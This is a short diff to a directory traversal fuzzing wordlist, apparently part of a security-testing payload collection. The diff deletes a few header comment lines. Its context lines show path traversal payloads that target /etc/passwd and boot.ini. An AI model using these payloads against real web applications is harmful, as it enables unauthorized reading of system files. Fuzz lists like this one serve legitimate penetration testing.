@@ -845,14 +845,11 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
 .\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
-# Directory Traversal Fuzzing Code
 # Luca "ikki" Carettoni - v0.1
 #
 # 847 attack vectors, 8 levels of recursion (Unix-like, Windows)
 #
-# Usage: replace boot.ini with the absolute URI of a local resource, then use 
 # your favourite web application fuzzer (e.g. wfuzz)
-
 ../boot.ini
 ../../boot.ini
 ../../../boot.ini
@@ -3567,7 +3564,6 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ..\..\\..\..\\..\..\\..\..\\\boot.ini
 # Derived from the awesome "Directory Traversal Fuzzing Code" v0.2 by Luca Carettoni
 # Did some cleanup & removed anything to the right of boot.ini for inclusion in a
-# separate fuzzfile for more flexibiity 
 /../boot.ini
 /../../boot.ini
 /../../../boot.ini
